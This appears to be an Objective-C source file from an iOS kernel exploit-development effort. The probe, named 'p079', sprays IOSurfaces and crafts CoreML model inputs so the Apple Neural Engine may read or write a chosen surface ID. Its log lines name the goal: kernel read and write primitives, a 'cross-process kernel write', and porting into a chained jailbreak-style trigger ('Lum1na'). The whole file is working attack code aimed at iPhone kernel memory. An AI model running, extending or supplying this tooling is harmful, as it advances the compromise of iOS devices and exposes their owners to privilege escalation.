//
//  P079AneYcraftPad.m — 43748 y-craft with engagement gate. See header.
//

#import "P079AneYcraftPad.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <math.h>
#import <string.h>
#import <unistd.h>

#define P079_BUILD  @"p079-ycraftpad-v1"
#define P079_MODEL  @"XVRC27_3in127ops_1out"
#define P079_N_SURF 412u
#define P079_CAP_MARK 0x53535353u
#define P079_ONES   0x3F800000u
#define P079_REPS   20u
#define P079_ENGAGE_MS 1.0    /* minAll must exceed minCpu by this to call ANE engaged */

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p079_iosCreate_t)(CFDictionaryRef);
typedef uint32_t (*p079_iosGetID_t)(IOSurfaceRef);
typedef void *(*p079_iosBase_t)(IOSurfaceRef);
typedef size_t (*p079_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p079_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} p079_surf_t;

static int g_p079_fd = -1;
static NSMutableString *g_p079_buf;

static void p079_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P079AneYcraftPad class]) {
        if (g_p079_buf) [g_p079_buf appendString:out];
        if (g_p079_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p079_fd, s, strlen(s));
                fcntl(g_p079_fd, F_FULLFSYNC);
            }
        }
    }
}

#pragma mark - IOSurface helpers

static p079_iosCreate_t  s_iosCreate;
static p079_iosGetID_t   s_iosGetID;
static p079_iosBase_t    s_iosBase;
static p079_iosAllocSz_t s_iosAllocSz;
static p079_iosLock_t    s_iosLock;
static p079_iosLock_t    s_iosUnlock;

static BOOL p079_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p079_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosGetID   = (p079_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosBase    = (p079_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p079_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p079_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p079_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosBase && s_iosAllocSz && s_iosLock && s_iosUnlock;
}

static CFNumberRef p079_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef p079_surface_create(void) {
    CFNumberRef w = p079_cfnum(1), h = p079_cfnum(1);
    CFNumberRef bpe = p079_cfnum(4), fmt = p079_cfnum(0x42475241);
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { w, h, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

static size_t p079_surface_fill_u32(IOSurfaceRef s, uint32_t pattern) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz == 0 || sz > (16UL << 20)) return 0;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return 0;
    uint32_t *p = (uint32_t *)base;
    for (size_t k = 0; k + 4 <= sz; k += 4) p[k / 4] = pattern;
    s_iosUnlock(s, 0, NULL);
    return sz;
}

static BOOL p079_surface_scan_pattern(p079_surf_t *e, const char *label, uint32_t pattern) {
    if (!e->surf) return NO;
    void *base = s_iosBase(e->surf);
    if (!base) return NO;
    size_t sz = e->allocSize;
    if (sz == 0 || sz > (16UL << 20)) return NO;
    if (s_iosLock(e->surf, 0, NULL) != KERN_SUCCESS) return NO;
    const uint8_t *b = (const uint8_t *)base;
    const uint8_t exp[4] = { (uint8_t)(pattern & 0xff), (uint8_t)((pattern >> 8) & 0xff),
                             (uint8_t)((pattern >> 16) & 0xff), (uint8_t)((pattern >> 24) & 0xff) };
    uint8_t first[16];
    memcpy(first, b, sizeof(first));
    size_t diffOff = sz;
    uint32_t diffCnt = 0;
    for (size_t k = 0; k < sz; k++) {
        if (b[k] != exp[k & 3]) { if (diffOff == sz) diffOff = k; diffCnt++; if (diffCnt >= 256) break; }
    }
    s_iosUnlock(e->surf, 0, NULL);
    if (diffOff != sz) {
        p079_log(@"  [!] %s TOUCHED sid=%u first diff at +0x%zx (>= %u bytes)",
                 label, e->sid, diffOff, diffCnt);
        p079_log(@"      first16 %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x",
                 first[0], first[1], first[2], first[3], first[4], first[5],
                 first[6], first[7], first[8], first[9], first[10], first[11],
                 first[12], first[13], first[14], first[15]);
        return YES;
    }
    return NO;
}

#pragma mark - fp16 + triple search

static double p079_fp16_decode(uint16_t bits) {
    uint32_t s = (bits >> 15) & 1u;
    uint32_t e = (bits >> 10) & 0x1Fu;
    uint32_t m = bits & 0x3FFu;
    double val;
    if (e == 0)      val = (double)m * 5.9604644775390625e-8;
    else if (e < 31) val = (1.0 + (double)m / 1024.0) * ldexp(1.0, (int)e - 15);
    else             val = (m == 0) ? INFINITY : NAN;
    return s ? -val : val;
}

static BOOL p079_find_triple(const uint32_t *sids, uint32_t n, uint32_t target,
                             uint32_t maxSid, uint32_t *aOut, uint32_t *bOut, uint32_t *cOut) {
    uint8_t *live = calloc(maxSid + 1, 1);
    for (uint32_t i = 0; i < n; i++)
        if (sids[i] >= 1 && sids[i] <= maxSid) live[sids[i]] = 1;
    if (target % 3 == 0 && target / 3 <= maxSid && live[target / 3]) {
        *aOut = *bOut = *cOut = target / 3; free(live); return YES;
    }
    for (uint32_t a = 1; a <= maxSid && 2 * a < target; a++) {
        if (!live[a]) continue;
        uint32_t b = target - 2 * a;
        if (b <= maxSid && live[b]) { *aOut = a; *bOut = a; *cOut = b; free(live); return YES; }
    }
    for (uint32_t a = 1; a <= maxSid; a++) {
        if (!live[a]) continue;
        for (uint32_t b = a; b <= maxSid; b++) {
            if (!live[b]) continue;
            uint32_t rest = target - a - b;
            if (rest < b || rest > maxSid) continue;
            if (live[rest]) { *aOut = a; *bOut = b; *cOut = rest; free(live); return YES; }
        }
    }
    free(live);
    return NO;
}

#pragma mark - CoreML

static NSURL *p079_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *p079_load(NSURL *url, MLComputeUnits units, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = units;
    return [MLModel modelWithContentsOfURL:url configuration:cfg error:errOut];
}

static MLDictionaryFeatureProvider *p079_provider3(double x0, double x1, double x2,
                                                   NSError **errOut) {
    double xs[3] = { x0, x1, x2 };
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < 3; i++) {
        MLMultiArray *m = [[MLMultiArray alloc] initWithShape:@[ @1 ]
                                                     dataType:MLMultiArrayDataTypeDouble
                                                        error:nil];
        if (!m) return nil;
        m[0] = @( xs[i] );
        features[[NSString stringWithFormat:@"x_%03u", i]] =
            [MLFeatureValue featureValueWithMultiArray:m];
    }
    return [[MLDictionaryFeatureProvider alloc] initWithDictionary:features error:errOut];
}

static double p079_predict(MLModel *model, MLDictionaryFeatureProvider *fp,
                           NSTimeInterval *dur, NSError **errOut) {
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    id<MLFeatureProvider> pred = [model predictionFromFeatures:fp error:errOut];
    CFAbsoluteTime t1 = CFAbsoluteTimeGetCurrent();
    *dur = t1 - t0;
    if (!pred) return NAN;
    MLFeatureValue *yv = [pred featureValueForName:@"y"];
    MLMultiArray *ya = yv.multiArrayValue;
    return ya ? ya[0].doubleValue : NAN;
}

static NSString *p079_yfmt(double y) {
    return (y == y) ? [NSString stringWithFormat:@"%.6e", y] : @"NaN";
}

@implementation P079AneYcraftPad

+ (NSString *)tap {
    g_p079_buf = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p079_ane_ycraftpad_log.txt"];
    g_p079_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p079_log(@"=== p079 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P079_BUILD);
    p079_log(@"43748 y-craft on %@ (3 inputs, 126 ops via cancel pairs).", P079_MODEL);
    p079_log(@"P078 lesson: bare 3-add graph never went to ANE (0.3ms CPU predicts) —");
    p079_log(@"y-craft untested, not disproven. This model keeps 3 inputs so ALL input");
    p079_log(@"records are valid (first-bad-record aborts, Ghidra bee5f818) and reaches");
    p079_log(@"the output record whose sid is hypothesized = previous predict's y.");
    p079_log(@"ENGAGEMENT GATE first: min-of-20 All vs CpuOnly. If CPU-only, verdict");
    p079_log(@"says so explicitly — no door, UNTESTED, not a theory failure.");
    p079_log(@"%@", [P007Board shared].kreadSignal);

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p079"];
    if (stop) {
        p079_log(@"%@", stop);
        if (g_p079_fd >= 0) { fcntl(g_p079_fd, F_FULLFSYNC); close(g_p079_fd); g_p079_fd = -1; }
        NSString *ret = g_p079_buf; g_p079_buf = nil; return ret;
    }
    p079_log(@"%@", [LabDeviceProfile identBlock]);

    if (!p079_resolve_iosurface()) {
        p079_log(@"[-] IOSurface dlsym FAILED — abort");
        p079_log(@"=== VERDICT ===");
        p079_log(@"abort (iosurface). hasKread=NO hasKwrite=NO.");
        if (g_p079_fd >= 0) { fcntl(g_p079_fd, F_FULLFSYNC); close(g_p079_fd); g_p079_fd = -1; }
        NSString *ret = g_p079_buf; g_p079_buf = nil; return ret;
    }

    /* ---- surfaces ---- */
    p079_surf_t *surfs = calloc(P079_N_SURF, sizeof(p079_surf_t));
    uint32_t made = 0;
    for (uint32_t i = 0; i < P079_N_SURF; i++) {
        IOSurfaceRef s = p079_surface_create();
        if (!s) continue;
        surfs[made].surf = s;
        surfs[made].sid = s_iosGetID(s);
        surfs[made].allocSize = s_iosAllocSz(s);
        made++;
    }
    p079_log(@"[+] surfaces: %u/%u", made, P079_N_SURF);
    if (made < 8) {
        p079_log(@"[-] too few surfaces — abort");
        p079_log(@"=== VERDICT ===");
        p079_log(@"abort (surfaces). hasKread=NO hasKwrite=NO.");
        if (g_p079_fd >= 0) { fcntl(g_p079_fd, F_FULLFSYNC); close(g_p079_fd); g_p079_fd = -1; }
        NSString *ret = g_p079_buf; g_p079_buf = nil; return ret;
    }
    p079_surf_t *cap = &surfs[made - 1];
    uint32_t sidC = cap->sid;
    uint32_t nCand = made - 1;

    for (uint32_t i = 0; i < made; i++)
        if (&surfs[i] != cap) p079_surface_fill_u32(surfs[i].surf, P079_ONES);
    p079_surface_fill_u32(cap->surf, P079_CAP_MARK);
    p079_log(@"[+] capture sid_C=%u; candidates %u sids in [%u..%u]",
             sidC, nCand, surfs[0].sid, surfs[nCand - 1].sid);

    uint32_t a1 = 0, b1 = 0, c1 = 0, a2 = 0, b2 = 0, c2 = 0;
    BOOL aOK = p079_find_triple(&surfs[0].sid, nCand, sidC, 2047, &a1, &b1, &c1);
    BOOL bOK = p079_find_triple(&surfs[0].sid, nCand, sidC, 1023, &a2, &b2, &c2);
    p079_log(@"[+] craft-A triple (<=2047): %s  {%u %u %u} sum=%u (target %u)",
             aOK ? "FOUND" : "none", a1, b1, c1, a1 + b1 + c1, sidC);
    p079_log(@"[+] craft-B triple (<=1023): %s  {%u %u %u} sum=%u",
             bOK ? "FOUND" : "none", a2, b2, c2, a2 + b2 + c2);

    /* ---- load models (All + CpuOnly for the engagement gate) ---- */
    NSError *err = nil;
    MLModel *model = p079_load(p079_model_url(P079_MODEL), MLComputeUnitsAll, &err);
    if (!model) {
        p079_log(@"[-] load FAILED: %@", err.localizedDescription ?: @"-");
        p079_log(@"=== VERDICT ===");
        p079_log(@"abort (load). hasKread=NO hasKwrite=NO.");
        for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p079_fd >= 0) { fcntl(g_p079_fd, F_FULLFSYNC); close(g_p079_fd); g_p079_fd = -1; }
        NSString *ret = g_p079_buf; g_p079_buf = nil; return ret;
    }
    MLModel *cpuModel = p079_load(p079_model_url(P079_MODEL), MLComputeUnitsCPUOnly, &err);
    p079_log(@"[+] %@ loaded (All); cpuOnly twin %@ (engagement reference)",
             P079_MODEL, cpuModel ? @"loaded" : @"FAILED");

    MLDictionaryFeatureProvider *fpW = p079_provider3((double)surfs[0].sid,
                                                      (double)surfs[1].sid,
                                                      (double)surfs[2].sid, &err);
    if (!fpW) {
        p079_log(@"[-] provider FAILED — abort");
        p079_log(@"=== VERDICT ===");
        p079_log(@"abort (provider). hasKread=NO hasKwrite=NO.");
        for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p079_fd >= 0) { fcntl(g_p079_fd, F_FULLFSYNC); close(g_p079_fd); g_p079_fd = -1; }
        NSString *ret = g_p079_buf; g_p079_buf = nil; return ret;
    }

    /* ---- ENGAGEMENT GATE: min-of-20 All vs CpuOnly ---- */
    double yW = NAN;
    NSTimeInterval d = 0;
    NSTimeInterval minAll = 1e9, minCpu = 1e9;
    for (uint32_t r = 0; r < P079_REPS; r++) {
        yW = p079_predict(model, fpW, &d, &err);
        if (d < minAll) minAll = d;
    }
    if (cpuModel) {
        for (uint32_t r = 0; r < P079_REPS; r++) {
            NSTimeInterval dc = 0;
            p079_predict(cpuModel, fpW, &dc, &err);
            if (dc < minCpu) minCpu = dc;
        }
    }
    BOOL engaged = cpuModel && (minAll > minCpu + P079_ENGAGE_MS / 1000.0);
    p079_log(@"[*] GATE W y=%@ minAll=%.2fms minCpu=%.2fms delta=%.2fms -> ANE %s",
             p079_yfmt(yW), minAll * 1000.0, minCpu * 1000.0,
             (minAll - minCpu) * 1000.0, engaged ? "ENGAGED" : "NOT ENGAGED");
    BOOL capW = p079_surface_scan_pattern(cap, "capture(W)", P079_CAP_MARK);

    if (!engaged) {
        p079_log(@"=== VERDICT ===");
        p079_log(@"ANE NOT ENGAGED — %@ still ran CPU-only (minAll %.2fms vs minCpu", P079_MODEL,
                 minAll * 1000.0);
        p079_log(@"%.2fms). No kernel request was sent; the y-craft is UNTESTED, not", minCpu * 1000.0);
        p079_log(@"disproven. Do NOT read this as a theory failure. Capture untouched=%d.", !capW);
        p079_log(@"NEXT: heavier pad (more ops / wider channels), or dump the compute plan");
        p079_log(@"(MLComputePlan device per op) to see why espresso keeps it on CPU.");
        [[P007Board shared] recordEvent:@"p079_session" kind:@"not_engaged"
                                 detail:[NSString stringWithFormat:@"minAll=%.2fms minCpu=%.2fms",
                                         minAll * 1000.0, minCpu * 1000.0]
                                 source:@"p079"];
        p079_log(@"Honesty: conversion bar untouched. hasKread=NO hasKwrite=NO.");
        for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
        free(surfs);
        if (g_p079_fd >= 0) { fcntl(g_p079_fd, F_FULLFSYNC); close(g_p079_fd); g_p079_fd = -1; }
        NSString *ret = g_p079_buf; g_p079_buf = nil; return ret;
    }

    /* ---- CRAFT-A (value-decode world) ---- */
    BOOL capA1 = NO, capA2 = NO, capA3 = NO;
    double yA1 = NAN, yA2 = NAN, yA3 = NAN;
    if (aOK) {
        p079_log(@">>> CRAFT-A: x=(%u,%u,%u) -> y==sid_C=%u exactly; next predict's output",
                 a1, b1, c1, sidC);
        p079_log(@"    entry sid hypothesized = fp16_value(staged y) = %u", sidC);
        MLDictionaryFeatureProvider *fpA = p079_provider3((double)a1, (double)b1, (double)c1, &err);
        yA1 = p079_predict(model, fpA, &d, &err);
        capA1 = p079_surface_scan_pattern(cap, "capture(A1)", P079_CAP_MARK);
        p079_log(@"[*] A1  y=%@ t=%.1fms cap=%d (sid_C shape = fallback/abort; 0.0/3.0 = ANE ran)",
                 p079_yfmt(yA1), d * 1000.0, capA1);

        yA2 = p079_predict(model, fpA, &d, &err);
        capA2 = p079_surface_scan_pattern(cap, "capture(A2)", P079_CAP_MARK);
        p079_log(@"[*] A2  y=%@ t=%.1fms cap=%d <- WRITE-DOOR SCAN (staged value = sid_C)",
                 p079_yfmt(yA2), d * 1000.0, capA2);

        yA3 = p079_predict(model, fpA, &d, &err);
        capA3 = p079_surface_scan_pattern(cap, "capture(A3)", P079_CAP_MARK);
        p079_log(@"[*] A3  y=%@ t=%.1fms cap=%d (stability)", p079_yfmt(yA3), d * 1000.0, capA3);
    } else {
        p079_log(@"[-] craft-A SKIPPED (no triple <= 2047)");
    }

    /* ---- CRAFT-B (raw-bits world) ---- */
    BOOL capB1 = NO, capB2 = NO, capB3 = NO;
    double yB1 = NAN, yB2 = NAN, yB3 = NAN;
    if (bOK) {
        double x0 = p079_fp16_decode((uint16_t)a2);
        double x1 = p079_fp16_decode((uint16_t)b2);
        double x2 = p079_fp16_decode((uint16_t)c2);
        p079_log(@">>> CRAFT-B: x bits=(0x%04x,0x%04x,0x%04x) sum=%u*2^-24; y bits target 0x%04x",
                 (uint16_t)a2, (uint16_t)b2, (uint16_t)c2, a2 + b2 + c2,
                 (uint16_t)(sidC & 0xFFFFu));
        MLDictionaryFeatureProvider *fpB = p079_provider3(x0, x1, x2, &err);
        yB1 = p079_predict(model, fpB, &d, &err);
        capB1 = p079_surface_scan_pattern(cap, "capture(B1)", P079_CAP_MARK);
        p079_log(@"[*] B1  y=%@ t=%.1fms cap=%d (expect %.9e exact)",
                 p079_yfmt(yB1), d * 1000.0, capB1, (double)(a2 + b2 + c2) * 5.9604644775390625e-8);

        yB2 = p079_predict(model, fpB, &d, &err);
        capB2 = p079_surface_scan_pattern(cap, "capture(B2)", P079_CAP_MARK);
        p079_log(@"[*] B2  y=%@ t=%.1fms cap=%d <- WRITE-DOOR SCAN (staged bits = sid_C)",
                 p079_yfmt(yB2), d * 1000.0, capB2);

        yB3 = p079_predict(model, fpB, &d, &err);
        capB3 = p079_surface_scan_pattern(cap, "capture(B3)", P079_CAP_MARK);
        p079_log(@"[*] B3  y=%@ t=%.1fms cap=%d (stability)", p079_yfmt(yB3), d * 1000.0, capB3);
    } else {
        p079_log(@"[-] craft-B SKIPPED (no triple <= 1023)");
    }

    BOOL inTouched = p079_surface_scan_pattern(&surfs[0], "cand[0](end)", P079_ONES);
    p079_log(@"[*] cand[0] touched=%d (expected NO)", inTouched);

    /* ---- verdict ---- */
    p079_log(@"=== VERDICT ===");
    BOOL writeDoor = (capA2 || capA3 || capB2 || capB3);
    BOOL aneRan = ((aOK && (yA2 == 0.0 || yA2 == 3.0)) ||
                   (bOK && (yB2 == 0.0 || yB2 == 3.0)));

    if (writeDoor) {
        p079_log(@"WRITE DOOR OPEN: capture (sid_C=%u) WRITTEN through the crafted output", sidC);
        p079_log(@"record — output entry sid = staged y = sid_C, fetch+wire+compute fired.");
        p079_log(@"Own-target this tap. Stage B: craft a FOREIGN sid as the y value =");
        p079_log(@"cross-process kernel write. Then port into Lum1na (chained trigger).");
        [[P007Board shared] recordEvent:@"p079_session" kind:@"write_door"
                                 detail:[NSString stringWithFormat:@"sid_C=%u", sidC]
                                 source:@"p079"];
    }
    if (aneRan) {
        p079_log(@"ANE RAN on OUR wired surfaces (y==0.0/3.0 with all-valid records):");
        p079_log(@"buffer-cache HIT with sid-from-staged-content at submit = CONFIRMED.");
        if (!writeDoor) {
            p079_log(@"Capture untouched -> output entry sid != staged content. Read door");
            p079_log(@"via wired inputs is LIVE: arm ONE foreign sid as x = y leaks foreign");
            p079_log(@"bytes (kernel read).");
        }
        [[P007Board shared] recordEvent:@"p079_session" kind:@"read_door"
                                 detail:@"y==0/3 on valid-input craft" source:@"p079"];
    }
    if (!writeDoor && !aneRan) {
        p079_log(@"Engaged but no door. y shapes: A1=%@ A2=%@ B1=%@ B2=%@",
                 p079_yfmt(yA1), p079_yfmt(yA2), p079_yfmt(yB1), p079_yfmt(yB2));
        p079_log(@"All-valid inputs + engagement confirmed, so the abort (if any) is at the");
        p079_log(@"OUTPUT record or the submit dict: the output entry sid is NOT the staged");
        p079_log(@"y. NEXT: hunt the CLIENT fill — who writes MemoryMapRequest entry");
        p079_log(@"field[0] (espresso/CoreML side) — and the submit dict sid source.");
        [[P007Board shared] recordEvent:@"p079_session" kind:@"miss"
                                 detail:@"engaged no door" source:@"p079"];
    }
    p079_log(@"Honesty: own surfaces only; foreign transfer not measured. Conversion bar");
    p079_log(@"(desc_type_forged OR (body_forged AND kptr)) untouched.");
    p079_log(@"hasKread=NO hasKwrite=NO. One TAP per force-quit; fresh boot next tap.");

    for (uint32_t i = 0; i < made; i++) if (surfs[i].surf) CFRelease(surfs[i].surf);
    free(surfs);

    if (g_p079_fd >= 0) { fcntl(g_p079_fd, F_FULLFSYNC); close(g_p079_fd); g_p079_fd = -1; }
    NSString *ret = g_p079_buf;
    g_p079_buf = nil;
    return ret;
}

@end